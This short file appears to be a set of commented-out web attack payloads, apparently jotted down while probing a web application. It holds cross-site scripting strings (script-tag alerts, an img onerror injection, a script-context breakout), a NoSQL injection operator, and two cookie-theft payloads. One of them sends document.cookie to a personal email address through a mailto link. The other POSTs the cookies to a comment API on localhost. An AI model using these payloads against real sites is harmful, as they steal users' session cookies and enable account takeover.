//  <script>alert("Done!!!")</script>;//
//  1,<script>alert("Done!!!")</script>;//
//  alert("Done!!!") ,
//  1}) </script> <script>alert("GGGGGG")</script>//
//  <img src="1" onerror="<script>alert("Done!!!")</script>">
//  {"$gt":""}
//  <script> alert(document.cookie); </script>

// document.onload(()=>{
//     const cook = document.cookie;
//     window.open(`mailto:sajadph375@gmail.com?subject=null&body=${cook}`)
// })

//  <script>(()=>{fetch('http://localhost:3000/api/addcomment',{method:'POST',headers: {"Content-Type":"application/json",},body: JSON.stringify({comment:document.cookie})});console.log(document.cookie);window.alert(document.cookie)})()</script>